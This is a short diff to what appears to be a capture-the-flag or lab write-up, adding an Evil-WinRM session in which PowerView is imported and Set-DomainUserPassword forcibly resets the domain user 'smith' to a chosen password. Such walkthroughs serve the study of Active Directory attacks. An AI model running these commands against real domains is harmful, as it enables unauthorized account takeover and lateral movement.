@@ -404,5 +404,9 @@ Info: Upload successful!
 Ill start by uploading powerview
 
 ```python
-
+*Evil-WinRM* PS C:\Users\oliver\Desktop> Import-Module .\powerview.ps1
+*Evil-WinRM* PS C:\Users\oliver\Desktop> $NewPassword = ConvertTo-SecureString 'Password1234!' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\oliver\Desktop> Set-DomainUserPassword -Identity 'smith' -AccountPassword $NewPassword
 ```
+This changed `smith` password
+
